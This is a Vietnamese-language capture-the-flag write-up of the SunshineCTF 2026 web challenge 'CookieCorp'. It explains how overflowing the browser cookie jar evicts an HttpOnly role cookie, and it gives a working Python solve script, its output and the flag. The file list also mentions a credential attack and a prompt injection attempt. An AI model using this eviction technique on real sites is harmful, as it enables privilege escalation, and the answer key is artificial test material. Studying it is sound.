---
title: "CookieCorp — Web (Medium)"
date: 2026-09-28 16:53:17 +0700
lastmod_at: 2026-09-28 16:53:17 +0700
categories: [Web]
tags: [sunshinectf, Web]
image:
  path: /CTFWU/SunshineCTF%202026/cookiecorp/files/de.png
---
**Flag:** `sun{c00kie_jar_0verfl0w_ev1cts_the_chief}`
**URL:** `https://tomorrow.web.2026.sunshinectf.games/` · tác giả geo

## Đề bài

> "A Better Cookie for a Brighter Tomorrow!"
>
> Welcome to CookieCorp, the Space Age's finest custom-cookie fabrication service. Design a batch
> from any ingredients you can dream up, then submit it to our tireless robotic Quality Inspector.
> Every recipe is loaded straight into the fabrication mixer for a full inspection.
>
> Get your batch reviewed and you'll earn an official seal. But the truly legendary bakers, the
> ones whose recipes earn the Chief's Golden Seal, take home the grand prize. Only the Chief can
> award that seal, though. And the Chief is a very busy robot.

## Phân tích ban đầu

Ứng dụng cho phép baker tạo recipe với các ingredient dạng `name=value`. Khi submit, một bot
inspector truy cập `/review/{id}` và chạy `mixer.js`:

```javascript
// mixer.js - logic chính
function dispense(ing) {
  document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';
}

async function run() {
  // Set mỗi ingredient thành một browser cookie
  for (var i = 0; i < recipe.ingredients.length; i++) {
    dispense(recipe.ingredients[i]);
  }
  // Gọi /api/seal để stamp verdict - server check cookie "role"
  var resp = await fetch('/api/seal', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ recipeId: recipe.id }),
  });
}
```

Những gì đo được:

- Khi login/register, server set cookie `role=baker; Path=/; HttpOnly; SameSite=Lax`.
- `HttpOnly` nghĩa là `document.cookie` không thể ghi đè cookie `role` đang tồn tại.
- Bot inspector mang `role` riêng (không phải `chief`), nên nó chỉ đóng dấu standard seal.
- Cần `role=chief` trong request tới `/api/seal` để nhận Golden Seal chứa flag.
- Tên và giá trị ingredient bị strip `;`, dấu cách và `=`, nên không inject được cookie attribute.

Tức là không có đường ghi đè trực tiếp. Chỉ còn một cách: làm cho cookie `role` cũ không còn
tồn tại trong jar khi bot gọi `/api/seal`.

## Chuỗi khai thác

### Cookie jar overflow

Trình duyệt giới hạn số cookie trên mỗi domain (~180 trong Chromium). Khi vượt giới hạn, browser
evict cookie cũ nhất, kể cả cookie HttpOnly.

1. Tạo recipe với **250 ingredient giả** (tên `x0000` đến `x0249`) để tràn cookie jar.
2. Thêm ingredient `role=chief` ở cuối danh sách.
3. Khi bot chạy `mixer.js`: 250 cookie mới tràn jar, cookie `role` HttpOnly cũ bị evict, rồi
   `role=chief` được set mới từ JavaScript.
4. Bot gọi `/api/seal` với `role=chief`, nhận Golden Seal kèm flag.

```python
import requests
import time

BASE = "https://tomorrow.web.2026.sunshinectf.games"
s = requests.Session()

# Register & login
s.post(f"{BASE}/register", json={"username": "solver_xyz", "password": "pass123"})

# Build 250 dummy ingredients + role=chief at the end
ingredients = [{"name": f"x{i:04d}", "value": f"v{i}"} for i in range(250)]
ingredients.append({"name": "role", "value": "chief"})

# Save recipe
r = s.post(f"{BASE}/api/recipe", json={
    "title": "Cookie Overflow",
    "ingredients": ingredients
})
recipe_id = r.json()["id"]
print(f"Recipe: {recipe_id}")

# Submit for bot review
s.post(f"{BASE}/api/recipe/{recipe_id}/submit")
print("Submitted, waiting for bot...")

# Wait for inspector bot to process
time.sleep(15)

# Check result
r = s.get(f"{BASE}/recipe/{recipe_id}")
if "sun{" in r.text:
    idx = r.text.index("sun{")
    end = r.text.index("}", idx)
    print(f"FLAG: {r.text[idx:end+1]}")
else:
    print("No flag yet, try refreshing")
```

```
Recipe: 4f8fdb4ccbdc2f8b78ade6c6
Submitted, waiting for bot...
FLAG: sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```

## Flag
```
sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```

## Hồ sơ điều tra

Folder này giữ toàn bộ quá trình dò trước khi có cờ, gồm các nhánh đã loại (mass assignment,
prototype pollution, NoSQL, SSTI/EJS, XSS qua sanitizer, prompt injection vào title, credential
attack vào username nghi là của staff) và các watcher theo dõi batch đã jam:

- `notes.md`, `notes-closed.md`, `analysis/` - log từng giả thuyết kèm `result: DEAD`
- `QUICK_REFERENCE.md`, `FINAL_SUMMARY.md` - bảng cơ chế app và các ngưỡng đã đo
- `files/` - capture từng trang, `mixer.js`, log các vòng quét
- `solve_overflow.py` - payload ăn cờ (250 ingredient ngắn + `role=chief` cuối danh sách)
- `exploit.py` - nhánh cũ: jam header theo **byte** để chờ Chief quét lại, không phải đường thắng
- `analysis/overflow3.py`, `analysis/overflow_seal.py`, `files/overflow_run.log` - các vòng
  thăm dò cơ chế tràn jar, ghi lại cả phép thử sai đã khiến eviction bị kết luận là không xảy ra
